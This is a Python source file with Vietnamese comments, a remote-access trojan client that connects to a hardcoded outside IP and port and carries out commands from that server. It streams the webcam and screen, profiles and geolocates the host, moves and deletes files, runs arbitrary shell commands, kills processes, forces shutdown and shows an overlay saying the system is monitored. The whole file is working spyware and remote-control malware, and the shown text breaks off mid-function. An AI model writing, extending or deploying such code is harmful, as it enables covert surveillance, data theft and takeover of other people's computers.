# client.py
import socket
import threading
import json
import time
import base64
from io import BytesIO
from PIL import Image
import cv2
from mss import mss
import os
import tempfile
import platform
import urllib.request
import ctypes
import sys
import psutil
import subprocess
import numpy as np

import psutil
import platform
import uuid
import requests
import socket
import subprocess
from datetime import datetime


SERVER_HOST = "217.154.161.167"
SERVER_PORT = 9536

sock = None
CLIENT_ID = None

# flags for streaming
stream_webcam = False
stream_screen = False

# threads
webcam_thread = None
screen_thread = None
stop_event = threading.Event()

# Quản lý kết nối
connection_active = False
reconnect_delay = 1
max_reconnect_delay = 60



# Thêm các biến global mới
alert_enabled = False
alert_text = ""
alert_thread = None
alert_stop_event = threading.Event()



# Tìm dòng này trong phần biến global:
alert_stop_event = threading.Event()

# THÊM NGAY SAU ĐÓ:
# Biến cho Alert Settings
alert_settings = {
    "text": "CẢNH BÁO: HỆ THỐNG ĐANG ĐƯỢC GIÁM SÁT",
    "font_size": 24,
    "text_color": "#FF0000",
    "bg_color": "#000000",
    "position_x": "center",
    "position_y": 50,
    "width": 600,
    "height": 80,
    "effect": "blink"
}




def get_system_info():
    """Thu thập thông tin hệ thống chi tiết"""
    try:
        info = {}
        
        # Network Information
        info['public_ip'] = get_public_ip()
        info['local_ip'] = get_local_ip()
        info['mac_address'] = get_mac_address()
        info['network_adapter'] = get_network_adapter_info()
        
        # Location từ IP
        info['location'] = get_location_from_ip(info['public_ip'])
        
        # System Information
        info['hostname'] = socket.gethostname()
        info['os_info'] = get_os_info()
        info['username'] = get_username()
        info['architecture'] = platform.architecture()[0]
        
        # Hardware Information
        info['cpu'] = get_cpu_info()
        info['cpu_cores'] = f"{psutil.cpu_count(logical=False)} physical, {psutil.cpu_count(logical=True)} logical"
        info['ram'] = get_ram_info()
        info['gpu'] = get_gpu_info()
        
        # Storage Information
        info.update(get_storage_info())
        
        # Additional Information
        info['boot_time'] = get_boot_time()
        info['uptime'] = get_uptime()
        info['python_version'] = platform.python_version()
        
        return info, 0
        
    except Exception as e:
        return {"error": f"Error collecting system info: {str(e)}"}, 1

def get_public_ip():
    """Lấy public IP"""
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text
    except:
        try:
            response = requests.get('https://ident.me', timeout=5)
            return response.text
        except:
            return "Unable to determine"

def get_local_ip():
    """Lấy local IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "Unable to determine"

def get_mac_address():
    """Lấy địa chỉ MAC"""
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                       for elements in range(0,2*6,2)][::-1])
        return mac
    except:
        return "Unable to determine"

def get_network_adapter_info():
    """Lấy thông tin adapter mạng"""
    try:
        interfaces = psutil.net_if_addrs()
        default_gateway = None
        for interface, addrs in interfaces.items():
            for addr in addrs:
                if addr.family == socket.AF_INET and not addr.address.startswith('127.'):
                    return f"{interface} ({addr.address})"
        return "Unknown"
    except:
        return "Unable to determine"

def get_location_from_ip(ip):
    """Lấy vị trí từ IP (chỉ country/city)"""
    if ip == "Unable to determine":
        return "Unknown"
    
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        data = response.json()
        if data['status'] == 'success':
            country = data.get('country', 'Unknown')
            city = data.get('city', 'Unknown')
            return f"{city}, {country}"
        return "Unknown"
    except:
        return "Unknown"

def get_os_info():
    """Lấy thông tin OS"""
    try:
        system = platform.system()
        if system == "Windows":
            # Lấy phiên bản Windows chi tiết
            result = subprocess.run(['systeminfo'], capture_output=True, text=True, encoding='cp850')
            lines = result.stdout.split('\n')
            for line in lines:
                if "OS Name:" in line:
                    os_name = line.split(":")[1].strip()
                    return f"{os_name} {platform.version()} {platform.architecture()[0]}"
        elif system == "Linux":
            # Lấy distro Linux
            try:
                with open('/etc/os-release', 'r') as f:
                    lines = f.readlines()
                    for line in lines:
                        if line.startswith('PRETTY_NAME='):
                            return line.split('=')[1].strip().strip('"')
            except:
                pass
        
        return f"{system} {platform.release()} {platform.architecture()[0]}"
    except:
        return f"{platform.system()} {platform.release()}"

def get_username():
    """Lấy username hiện tại"""
    try:
        import getpass
        return getpass.getuser()
    except:
        try:
            import os
            return os.getlogin()
        except:
            return "Unknown"

def get_cpu_info():
    """Lấy thông tin CPU"""
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
            cpu_name, _ = winreg.QueryValueEx(key, "ProcessorNameString")
            winreg.CloseKey(key)
            return cpu_name.strip()
        else:
            with open('/proc/cpuinfo', 'r') as f:
                for line in f:
                    if line.strip().startswith('model name'):
                        return line.split(':')[1].strip()
        return f"{platform.processor()} ({psutil.cpu_count()} cores)"
    except:
        return f"{platform.processor()} ({psutil.cpu_count()} cores)"

def get_ram_info():
    """Lấy thông tin RAM"""
    try:
        ram = psutil.virtual_memory()
        total_gb = ram.total / (1024**3)
        return f"{total_gb:.1f} GB"
    except:
        return "Unknown"

def get_gpu_info():
    """Lấy thông tin GPU"""
    try:
        if platform.system() == "Windows":
            result = subprocess.run([
                'wmic', 'path', 'win32_VideoController', 'get', 'name'
            ], capture_output=True, text=True)
            lines = result.stdout.strip().split('\n')
            if len(lines) > 1:
                return lines[1].strip()
        return "Unknown or Integrated Graphics"
    except:
        return "Unknown"

def get_storage_info():
    """Lấy thông tin storage"""
    try:
        drives = {}
        for partition in psutil.disk_partitions():
            if platform.system() == "Windows" and 'cdrom' in partition.opts:
                continue
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                drives[partition.mountpoint] = {
                    'total': usage.total,
                    'free': usage.free,
                    'used': usage.used
                }
            except:
                continue
        
        # Tìm ổ hệ thống (thường là C: trên Windows hoặc / trên Linux)
        system_drive = 'C:\\' if platform.system() == "Windows" else '/'
        if system_drive in drives:
            drive = drives[system_drive]
            total_gb = drive['total'] / (1024**3)
            free_gb = drive['free'] / (1024**3)
            used_gb = drive['used'] / (1024**3)
            
            return {
                'system_drive': system_drive,
                'total_space': f"{total_gb:.1f} GB",
                'free_space': f"{free_gb:.1f} GB",
                'used_space': f"{used_gb:.1f} GB"
            }
        
        return {
            'system_drive': 'Unknown',
            'total_space': 'Unknown',
            'free_space': 'Unknown',
            'used_space': 'Unknown'
        }
    except:
        return {
            'system_drive': 'Unknown',
            'total_space': 'Unknown',
            'free_space': 'Unknown',
            'used_space': 'Unknown'
        }

def get_boot_time():
    """Lấy thời gian boot"""
    try:
        boot_time = psutil.boot_time()
        return datetime.fromtimestamp(boot_time).strftime("%Y-%m-%d %H:%M:%S")
    except:
        return "Unknown"

def get_uptime():
    """Lấy thời gian uptime"""
    try:
        boot_time = psutil.boot_time()
        uptime_seconds = time.time() - boot_time
        days = int(uptime_seconds // 86400)
        hours = int((uptime_seconds % 86400) // 3600)
        minutes = int((uptime_seconds % 3600) // 60)
        return f"{days}d {hours}h {minutes}m"
    except:
        return "Unknown"



# Hàm mới: Hiển thị alert overlay độc lập
# Hàm mới: Hiển thị alert overlay đơn giản - chỉ 1 dòng chữ đỏ giữa màn hình
# Hàm mới: Hiển thị alert overlay với hỗ trợ Tiếng Việt
# Hàm mới: Hiển thị alert overlay với tùy chỉnh đầy đủ
def alert_overlay_loop():
    global alert_enabled, alert_text, alert_settings
    print("[ALERT] Starting advanced alert overlay")
    
    try:
        import pyautogui
    except ImportError:
        print("[ALERT] pyautogui not available for alert overlay")
        return
        
    # Biến cho hiệu ứng
    effect_counter = 0
    color_cycle = ["#FF0000", "#00FF00", "#0000FF", "#FFFF00", "#FF00FF", "#00FFFF"]
    
    while not alert_stop_event.is_set() and alert_enabled:
        try:
            # Lấy kích thước màn hình
            screen_width, screen_height = pyautogui.size()
            
            # Tính toán kích thước và vị trí overlay
            overlay_width = alert_settings["width"]
            overlay_height = alert_settings["height"]
            
            # Tính toán vị trí X
            if alert_settings["position_x"] == "center":
                window_x = (screen_width - overlay_width) // 2
            elif alert_settings["position_x"] == "left":
                window_x = 50
            elif alert_settings["position_x"] == "right":
                window_x = screen_width - overlay_width - 50
            else:
                window_x = int(alert_settings["position_x"])
            
            # Vị trí Y
            window_y = alert_settings["position_y"]
            
            # Xử lý hiệu ứng
            current_text_color = alert_settings["text_color"]
            current_bg_color = alert_settings["bg_color"]
            
            if alert_settings["effect"] == "blink":
                # Nhấp nháy
                if effect_counter % 20 < 10:
                    current_text_color = alert_settings["text_color"]
                else:
                    current_text_color = alert_settings["bg_color"]
                    
            elif alert_settings["effect"] == "color_change":
                # Đổi màu
                color_index = (effect_counter // 10) % len(color_cycle)
                current_text_color = color_cycle[color_index]
            
            # Tạo ảnh với PIL
            from PIL import Image, ImageDraw, ImageFont
            pil_img = Image.new('RGB', (overlay_width, overlay_height), color=current_bg_color)
            draw = ImageDraw.Draw(pil_img)
            
            # Thử các font khác nhau
            font_size = alert_settings["font_size"]
            try:
                font = ImageFont.truetype("arial.ttf", font_size)
            except:
                try:
                    font = ImageFont.truetype("segoeui.ttf", font_size)
                except:
                    try:
                        font = ImageFont.truetype("tahoma.ttf", font_size)
                    except:
                        font = ImageFont.load_default()
            
            # Tính toán vị trí text
            text = alert_settings["text"]
            bbox = draw.textbbox((0, 0), text, font=font)
            text_width = bbox[2] - bbox[0]
            text_height = bbox[3] - bbox[1]
            text_x = (overlay_width - text_width) // 2
            text_y = (overlay_height - text_height) // 2
            
            # Vẽ text
            draw.text((text_x, text_y), text, font=font, fill=current_text_color)
            
            # Chuyển PIL image sang OpenCV
            overlay = cv2.cvtColor(np.array(pil_img), cv2.COLOR_RGB2BGR)
            
            # Tạo và cấu hình window
            cv2.namedWindow("ALERT_OVERLAY", cv2.WINDOW_NORMAL)
            cv2.moveWindow("ALERT_OVERLAY", window_x, window_y)
            cv2.resizeWindow("ALERT_OVERLAY", overlay_width, overlay_height)
            
            # Đặt thuộc tính window
            try:
                import win32gui
                import win32con
                hwnd = win32gui.FindWindow(None, "ALERT_OVERLAY")
                if hwnd:
                    style = win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE)
                    style |= win32con.WS_EX_TOOLWINDOW
                    style |= win32con.WS_EX_NOACTIVATE
                    win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, style)
                    
                    win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 
                                         window_x, window_y, overlay_width, overlay_height,
                                         win32con.SWP_NOACTIVATE)
            except Exception as e:
                print(f"[ALERT] Windows style setting failed: {e}")
                cv2.setWindowProperty("ALERT_OVERLAY", cv2.WND_PROP_TOPMOST, 1)
            
            # Hiển thị overlay
            cv2.imshow("ALERT_OVERLAY", overlay)
            cv2.waitKey(1)
            
            effect_counter += 1
            time.sleep(0.05)  # 20 FPS
            
        except Exception as e:
            print(f"[ALERT] Overlay error: {e}")
            break
    
    # Dọn dẹp khi thoát
    try:
        cv2.destroyWindow("ALERT_OVERLAY")
    except:
        pass
    print("[ALERT] Alert overlay stopped")
# Hàm mới: Bật/tắt alert overlay
# Hàm mới: Bật/tắt alert overlay
# Hàm mới: Bật/tắt alert overlay với settings
def toggle_alert_overlay(enabled, settings=None):
    global alert_enabled, alert_settings, alert_thread, alert_stop_event
    
    alert_enabled = enabled
    
    # Cập nhật settings nếu có
    if settings:
        alert_settings.update(settings)
    
    if enabled:
        # Dừng alert cũ nếu đang chạy
        alert_stop_event.set()
        if alert_thread and alert_thread.is_alive():
            alert_thread.join(timeout=1.0)
        
        # Start alert mới
        alert_stop_event.clear()
        alert_thread = threading.Thread(target=alert_overlay_loop, daemon=True)
        alert_thread.start()
        print(f"[ALERT] Alert overlay started with settings: {alert_settings}")
    else:
        # Dừng alert
        alert_stop_event.set()
        print("[ALERT] Alert overlay stopped")


# ----- protocol helpers -----
def send_packet(obj):
    global sock, connection_active
    if sock is None or not connection_active:
        return False
    try:
        payload = json.dumps(obj).encode('utf-8')
        header = f"{len(payload)}\n".encode('utf-8')
        
        # GỬI CẢ HEADER VÀ PAYLOAD TRONG MỘT LẦN
        full_packet = header + payload
        sock.sendall(full_packet)
        
        #print(f"[CLIENT] Sent packet: {obj.get('type', 'unknown')}")
        return True
        
    except BrokenPipeError:
        print("[CLIENT] Broken pipe in send_packet")
        connection_active = False
        return False
    except ConnectionResetError:
        print("[CLIENT] Connection reset in send_packet")
        connection_active = False
        return False
    except Exception as e:
        print(f"[CLIENT] Send packet error: {e}")
        connection_active = False
        return False


import socket

def recv_packet(timeout=None):
    global sock, connection_active

    if sock is None:
        return None

    try:
        if timeout is not None:
            sock.settimeout(timeout)

        # Đọc header
        header = b""
        while not header.endswith(b"\n"):
            try:
                part = sock.recv(1)
            except socket.timeout:
                # Hết thời gian chờ khi đang chờ header
                # -> KHÔNG coi là mất kết nối, chỉ báo None
                # print("[CLIENT] recv header timed out")
                return None

            if not part:
                print("[CLIENT] Socket closed by server while reading header")
                connection_active = False
                return None
            header += part

        length_str = header.decode().strip()
        if not length_str.isdigit():
            print(f"[CLIENT] Invalid length header: {length_str!r}")
            connection_active = False
            return None

        packet_length = int(length_str)

        # Đọc data
        data = b""
        while len(data) < packet_length:
            try:
                part = sock.recv(min(4096, packet_length - len(data)))
            except socket.timeout:
                # Hết thời gian chờ khi đang đọc data
                # Tùy logic: có thể giữ lại 'data' hoặc bỏ
                # Ở đây mình bỏ, coi như chưa nhận xong -> None
                # print("[CLIENT] recv data timed out")
                return None

            if not part:
                print("[CLIENT] Socket closed by server while reading data")
                connection_active = False
                return None
            data += part

        try:
            msg = json.loads(data.decode("utf-8"))
            return msg
        except Exception as e:
            print(f"[CLIENT] Failed to parse packet: {e}")
            return None

    except (ConnectionResetError, BrokenPipeError) as e:
        print(f"[CLIENT] Connection lost in recv_packet: {e}")
        connection_active = False
        return None
    except OSError as e:
        # Các lỗi OS khác (không phải timeout)
        print(f"[CLIENT] Recv OSError: {e}")
        connection_active = False
        return None
    except Exception as e:
        print(f"[CLIENT] Recv packet error: {e}")
        connection_active = False
        return None






def send_heartbeat():
    global connection_active, sock
    while connection_active:  # Thay vì while True
        if not connection_active or sock is None:
            time.sleep(1)
            continue

        try:
            packet = {
                "type": "heartbeat",
                "client_id": CLIENT_ID,
                "timestamp": time.time()
            }
            if not send_packet(packet):
                print("[HEARTBEAT] Failed to send heartbeat")
                # KHÔNG break, chỉ sleep và thử lại
                time.sleep(5)
                continue

            time.sleep(5)

        except Exception as e:
            print(f"[HEARTBEAT] Error: {e}")
            # KHÔNG break, chỉ sleep và thử lại
            time.sleep(5)




def is_network_available():
    """Kiểm tra kết nối mạng tổng quát"""
    try:
        # Thử kết nối đến DNS public
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except OSError:
        pass
    
    try:
        # Thử kết nối đến website phổ biến
        socket.create_connection(("google.com", 80), timeout=3)
        return True
    except OSError:
        pass
    
    return False


    # Thêm vào Client.py trong phần execute_command hoặc tạo hàm riêng

def list_directory(path="."):
    """Liệt kê thư mục và file trong đường dẫn"""
    try:
        if not os.path.exists(path):
            return {"error": f"Path does not exist: {path}"}, 1
        
        abs_path = os.path.abspath(path)
        items = []
        
        # Lấy danh sách item trong thư mục
        for item in os.listdir(abs_path):
            item_path = os.path.join(abs_path, item)
            try:
                is_dir = os.path.isdir(item_path)
                size = os.path.getsize(item_path) if not is_dir else 0
                items.append({
                    "name": item,
                    "is_directory": is_dir,
                    "size": size,
                    "path": item_path
                })
            except (OSError, PermissionError):
                # Bỏ qua các file/thư mục không có quyền truy cập
                continue
        
        # Sắp xếp: thư mục trước, file sau
        items.sort(key=lambda x: (not x["is_directory"], x["name"].lower()))
        
        return {
            "current_path": abs_path,
            "items": items,
            "parent_path": os.path.dirname(abs_path) if abs_path != os.path.dirname(abs_path) else None
        }, 0
        
    except Exception as e:
        return {"error": f"Error listing directory: {str(e)}"}, 1

# Thêm hàm get_file để xử lý download file
def get_file(file_path):
    """Đọc và trả về nội dung file dưới dạng base64"""
    try:
        if not os.path.exists(file_path):
            return {"error": f"File not found: {file_path}"}, 1
        
        # Kiểm tra kích thước file (giới hạn 10MB)
        file_size = os.path.getsize(file_path)
        if file_size > 50 * 1024 * 1024:
            return {"error": f"File too large: {file_size} bytes (max 50MB)"}, 1
        
        # Đọc file
        with open(file_path, 'rb') as f:
            file_content = f.read()
        
        file_name = os.path.basename(file_path)
        file_data_b64 = base64.b64encode(file_content).decode()
        
        return {
            "file_name": file_name,
            "file_data": file_data_b64,
            "file_size": file_size
        }, 0
        
    except Exception as e:
        return {"error": f"Error reading file: {str(e)}"}, 1





def delete_item(item_path, item_type):
    """Xóa file hoặc thư mục"""
    try:
        print(f"[DELETE] Attempting to delete: {item_path} (Type: {item_type})")
        
        if not os.path.exists(item_path):
            error_msg = f"Error: Path does not exist: {item_path}"
            print(f"[DELETE] {error_msg}")
            return error_msg, 1
        
        if item_type == "File":
            print(f"[DELETE] Removing file: {item_path}")
            os.remove(item_path)
            success_msg = f"File deleted: {item_path}"
            print(f"[DELETE] {success_msg}")
            return success_msg, 0
        elif item_type == "Folder":
            print(f"[DELETE] Removing folder: {item_path}")
            import shutil
            shutil.rmtree(item_path)
            success_msg = f"Folder deleted: {item_path}"
            print(f"[DELETE] {success_msg}")
            return success_msg, 0
        else:
            error_msg = f"Error: Unknown item type: {item_type}"
            print(f"[DELETE] {error_msg}")
            return error_msg, 1
            
    except PermissionError as e:
        error_msg = f"Error: Permission denied - cannot delete {item_path}"
        print(f"[DELETE] {error_msg}: {e}")
        return error_msg, 1
    except Exception as e:
        error_msg = f"Error deleting {item_path}: {str(e)}"
        print(f"[DELETE] {error_msg}")
        return error_msg, 1



def upload_file(file_name, file_data_b64, destination_path):
    """Lưu file được upload từ admin"""
    try:
        # Giải mã dữ liệu
        file_data = base64.b64decode(file_data_b64)
        
        # Tạo đường dẫn đầy đủ
        full_path = os.path.join(destination_path, file_name)
        
        # Kiểm tra và tạo thư mục nếu cần
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        
        # Kiểm tra file đã tồn tại
        if os.path.exists(full_path):
            # Đổi tên file nếu đã tồn tại
            base_name, ext = os.path.splitext(file_name)
            counter = 1
            while os.path.exists(full_path):
                new_name = f"{base_name}_{counter}{ext}"
                full_path = os.path.join(destination_path, new_name)
                counter += 1
        
        # Lưu file
        with open(full_path, 'wb') as f:
            f.write(file_data)
        
        return f"File uploaded successfully: {os.path.basename(full_path)}", 0
        
    except Exception as e:
        return f"Error uploading file: {str(e)}", 1


# ----- optimized streaming workers -----
def webcam_loop():
    global stream_webcam
    print("[WEBCAM] Starting webcam stream with optimizations")
    cap = None
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            print("Webcam not available")
            return
        
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        cap.set(cv2.CAP_PROP_FPS, 15)
        
        frame_skip = 1
        frame_count = 0
        
        while stream_webcam and not stop_event.is_set() and connection_active:
            ret, frame = cap.read()
            if not ret:
                time.sleep(0.033)
                continue
            
            frame_count += 1
            if frame_count % (frame_skip + 1) != 0:
                continue
            
            frame = cv2.resize(frame, (480, 360))
            
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 40]
            _, jpg = cv2.imencode('.jpg', frame, encode_param)
            
            if len(jpg) > 50000:
                frame = cv2.resize(frame, (320, 240))
                _, jpg = cv2.imencode('.jpg', frame, encode_param)
            
            b64 = base64.b64encode(jpg.tobytes()).decode()

            packet = {
                "type": "stream_frame",
                "client_id": CLIENT_ID,
                "stream_type": "webcam",
                "image": b64,
                "timestamp": time.time()
            }
            
            if not send_packet(packet):
                break

            time.sleep(0.033)
    
    except Exception as e:
        print(f"[WEBCAM] Error in webcam loop: {e}")
    finally:
        if cap:
            cap.release()
        print("[WEBCAM] Webcam stream stopped")

def screen_loop():
    global stream_screen
    print("[SCREEN] Starting screen stream with optimizations")
    
    sct = mss()
    monitor = sct.monitors[1]
    
    capture_width = 1024
    capture_height = 768
    
    monitor_width = monitor["width"]
    monitor_height = monitor["height"]
    
    scale_factor = min(capture_width / monitor_width, capture_height / monitor_height)
    capture_width = int(monitor_width * scale_factor)
    capture_height = int(monitor_height * scale_factor)
    
    frame_skip = 2
    frame_count = 0
    
    while stream_screen and not stop_event.is_set() and connection_active:
        s = sct.grab(monitor)
        
        frame_count += 1
        if frame_count % (frame_skip + 1) != 0:
            time.sleep(0.02)
            continue

        img = Image.frombytes("RGB", s.size, s.rgb)
        img = img.resize((capture_width, capture_height), Image.Resampling.LANCZOS)
        
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

        try:
            import pyautogui
            mx, my = pyautogui.position()
            cursor_x = int(mx * scale_factor)
            cursor_y = int(my * scale_factor)

            outer_radius = 8
            inner_radius = 3

            outer_color = (0, 255, 255)
            inner_color = (0, 0, 255)

            cv2.circle(frame, (cursor_x, cursor_y), outer_radius, outer_color, 2)
            cv2.circle(frame, (cursor_x, cursor_y), inner_radius, inner_color, -1)
        except:
            pass

        encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 30]
        _, jpg = cv2.imencode('.jpg', frame, encode_param)
        
        if len(jpg) > 80000:
            frame = cv2.resize(frame, (640, 480))
            _, jpg = cv2.imencode('.jpg', frame, encode_param)

        b64 = base64.b64encode(jpg.tobytes()).decode()

        packet = {
            "type": "stream_frame",
            "client_id": CLIENT_ID,
            "stream_type": "screen",
            "image": b64,
            "timestamp": time.time()
        }

        if not send_packet(packet):
            break

        time.sleep(0.05)
    
    print("[SCREEN] Screen stream stopped")

# ... (giữ nguyên các hàm set_wallpaper_local, do_shutdown, get_process_list, kill_process, execute_command) ...


def set_wallpaper_local(filepath):
    """Đặt hình nền từ file local"""
    system = platform.system()
    try:
        if system == "Windows":
            # Kiểm tra file tồn tại
            if not os.path.exists(filepath):
                print(f"Wallpaper file not found: {filepath}")
                return False
                
            abspath = os.path.abspath(filepath)
            print(f"[WALLPAPER] Setting wallpaper from: {abspath}")
            
            # Sử dụng SystemParametersInfo để đặt wallpaper
            SPI_SETDESKWALLPAPER = 20
            SPIF_UPDATEINIFILE = 0x1
            SPIF_SENDWININICHANGE = 0x2
            
            result = ctypes.windll.user32.SystemParametersInfoW(
                SPI_SETDESKWALLPAPER, 
                0, 
                abspath,
                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE
            )
            
            if result:
                print("[WALLPAPER] Wallpaper set successfully on Windows")
                return True
            else:
                print("[WALLPAPER] Failed to set wallpaper on Windows")
                # Thử phương pháp thay thế
                try:
                    import win32api
                    import win32con
                    import win32gui
                    win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, abspath, 1+2)
                    print("[WALLPAPER] Wallpaper set using win32gui")
                    return True
                except:
                    print("[WALLPAPER] Alternative method also failed")
                    return False
                    
        elif system == "Linux":
            try:
                # Kiểm tra file tồn tại
                if not os.path.exists(filepath):
                    print(f"Wallpaper file not found: {filepath}")
                    return False
                    
                abspath = os.path.abspath(filepath)
                print(f"[WALLPAPER] Setting wallpaper from: {abspath}")
                
                # Thử dùng gsettings (GNOME)
                cmd = f"gsettings set org.gnome.desktop.background picture-uri 'file://{abspath}'"
                result = os.system(cmd)
                
                if result == 0:
                    print("[WALLPAPER] Wallpaper set successfully on Linux (GNOME)")
                    return True
                else:
                    # Thử phương pháp khác cho các DE khác
                    print("[WALLPAPER] Trying alternative Linux methods...")
                    
                    # Thử dùng feh (cho các window manager nhẹ)
                    cmd = f"feh --bg-scale {abspath}"
                    result = os.system(cmd)
                    
                    if result == 0:
                        print("[WALLPAPER] Wallpaper set using feh")
                        return True
                    else:
                        print("[WALLPAPER] All Linux methods failed")
                        return False
                        
            except Exception as e:
                print(f"[WALLPAPER] Linux wallpaper error: {e}")
                return False
        else:
            print(f"[WALLPAPER] Set wallpaper not implemented for: {system}")
            return False
            
    except Exception as e:
        print(f"[WALLPAPER] General error: {e}")
        return False



def save_base64_wallpaper(b64_data, filepath):
    """Lưu wallpaper từ base64"""
    try:
        print(f"[WALLPAPER] Saving base64 wallpaper to: {filepath}")
        
        # Giải mã base64
        image_data = base64.b64decode(b64_data)
        
        # Kiểm tra định dạng ảnh
        try:
            img = Image.open(BytesIO(image_data))
            # Chuyển đổi sang RGB nếu cần
            if img.mode in ('RGBA', 'LA', 'P'):
                img = img.convert('RGB')
        except Exception as e:
            print(f"[WALLPAPER] Image validation failed: {e}")
            return False
        
        # Lưu file
        with open(filepath, 'wb') as f:
            f.write(image_data)
            
        print(f"[WALLPAPER] Base64 wallpaper saved successfully")
        return True
        
    except Exception as e:
        print(f"[WALLPAPER] Base64 save error: {e}")
        return False


def download_wallpaper_from_url(url, filepath):
    """Tải wallpaper từ URL"""
    try:
        print(f"[WALLPAPER] Downloading wallpaper from: {url}")
        
        # Tạo header để tránh bị chặn
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as response:
            data = response.read()
            
        with open(filepath, 'wb') as f:
            f.write(data)
            
        print(f"[WALLPAPER] Downloaded to: {filepath}")
        return True
        
    except Exception as e:
        print(f"[WALLPAPER] Download error: {e}")
        return False


def do_shutdown():
    system = platform.system()
    print("[CLIENT] Shutdown command received")
    if system == "Windows":
        os.system("shutdown /s /t 0")
    elif system == "Linux":
        os.system("shutdown now")
    else:
        print("Shutdown not supported on this OS")

def get_process_list():
    plist = []
    for p in psutil.process_iter(['pid', 'name']):
        try:
            plist.append({"pid": p.info['pid'], "name": p.info['name']})
        except:
            pass
    return plist

def kill_process(pid):
    try:
        p = psutil.Process(pid)
        p.terminate()
        print(f"[CLIENT] Killed process {pid}")
    except Exception as e:
        print(f"Kill error: {e}")

current_working_dir = os.getcwd()

def execute_command(command):
    global current_working_dir
    try:
        if command.strip().startswith('cd '):
            new_dir = command.strip()[3:].strip()
            try:
                if new_dir == "..":
                    current_working_dir = os.path.dirname(current_working_dir)
                elif os.path.isabs(new_dir):
                    current_working_dir = new_dir
                else:
                    current_working_dir = os.path.join(current_working_dir, new_dir)
                current_working_dir = os.path.abspath(current_working_dir)
                return f"Changed directory to: {current_working_dir}", 0
            except Exception as e:
                return f"cd error: {str(e)}", 1
        
        if platform.system() == "Windows":
            process = subprocess.Popen(
                f'cmd /c "{command}"',
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                shell=True,
                text=True,
                encoding='cp850',
                cwd=current_working_dir
            )
        else:
            process = subprocess.Popen(
                f'/bin/bash -c "{command}"',
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                shell=True,
                text=True,
                cwd=current_working_dir
            )
            
        stdout, stderr = process.communicate()
        returncode = process.returncode
        output = stdout if stdout else stderr
        return output, returncode
        
    except Exception as e:
        return f"Command execution error: {str(e)}", 1

def listen_loop():
    global CLIENT_ID, stream_webcam, stream_screen, webcam_thread, screen_thread, connection_active

    while connection_active:
        try:
            # KIỂM TRA KẾT NỐI TRƯỚC KHI NHẬN PACKET
            if sock is None or not connection_active:
                break
                
            msg = recv_packet(timeout=None)
            
            if msg is None:
                # Timeout, kiểm tra kết nối còn sống
                print("[CLIENT] Receive timeout, checking connection...")
                # Gửi heartbeat để kiểm tra
                try:
                    test_packet = {"type": "heartbeat", "client_id": CLIENT_ID}
                    if not send_packet(test_packet):
                        print("[CLIENT] Connection dead after timeout")
                        break
                    else:
                        print("[CLIENT] Connection still alive, continuing...")
                        continue
                except:
                    print("[CLIENT] Connection check failed")
                    break
                
            if msg.get("type") == "timeout":
                continue  # Continue loop on timeout
                
            if msg.get("type") == "pong":
                continue  # Ignore pong responses

            if msg.get("type") == "assign_id":
                CLIENT_ID = msg.get("client_id")
                print("Assigned CLIENT_ID:", CLIENT_ID)
                continue

            if msg.get("type") == "command":
                command_field = msg.get("command")

                if isinstance(command_field, str):
                    action = command_field

                    if action == "start_webcam":
                        if not stream_webcam:
                            stream_webcam = True
                            webcam_thread = threading.Thread(target=webcam_loop, daemon=True)
                            webcam_thread.start()

                    elif action == "stop_webcam":
                        stream_webcam = False

                    elif action == "start_screen":
                        if not stream_screen:
                            stream_screen = True
                            screen_thread = threading.Thread(target=screen_loop, daemon=True)
                            screen_thread.start()

                    elif action == "stop_screen":
                        stream_screen = False

                    elif action == "shutdown":
                        do_shutdown()





                    continue

                if isinstance(command_field, dict):
                    act = command_field.get("action")

                    if act == "set_wallpaper":
                        src = command_field.get("source")
                        success = False
                        
                        try:
                            if src == "url":
                                url = command_field.get("url")
                                if url:
                                    print(f"[WALLPAPER] Processing URL wallpaper: {url}")
                                    file_ext = os.path.splitext(url)[1]
                                    if not file_ext:
                                        file_ext = '.jpg'
                                    
                                    tmpfd, tmppath = tempfile.mkstemp(suffix=file_ext)
                                    os.close(tmpfd)
                                    
                                    if download_wallpaper_from_url(url, tmppath):
                                        success = set_wallpaper_local(tmppath)
                                    else:
                                        print("[WALLPAPER] Failed to download from URL")
                                    
                                    try:
                                        os.unlink(tmppath)
                                    except:
                                        pass

                            elif src == "local":
                                b64 = command_field.get("image_b64")
                                filename = command_field.get("filename", "wallpaper.jpg")
                                if b64:
                                    print(f"[WALLPAPER] Processing local wallpaper: {filename}")
                                    file_ext = os.path.splitext(filename)[1]
                                    if not file_ext:
                                        file_ext = '.jpg'
                                    
                                    tmpfd, tmppath = tempfile.mkstemp(suffix=file_ext)
                                    os.close(tmpfd)
                                    
